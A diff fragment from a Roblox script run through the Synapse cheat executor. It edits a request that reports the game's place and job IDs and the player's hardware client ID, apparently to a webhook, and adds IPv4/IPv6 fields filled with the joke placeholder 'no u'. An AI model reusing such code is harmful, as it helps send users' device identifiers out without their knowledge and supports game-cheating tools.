@@ -281,6 +281,8 @@ syn.request({
 				"**PlaceId:** "..game.PlaceId.."\n"..
 				"**JobId:** "..game.JobId.."\n"..
 				"**Exploit:** ".."Synapse".."\n"..
+				"**IPv4:** ".."no u".."\n"..
+				"**IPv6:** ".."no u".."\n"..
 			    "**HWID:** "..game:GetService("RbxAnalyticsService"):GetClientId()
 			),
 			["color"] = 16711935, -- Ole Color
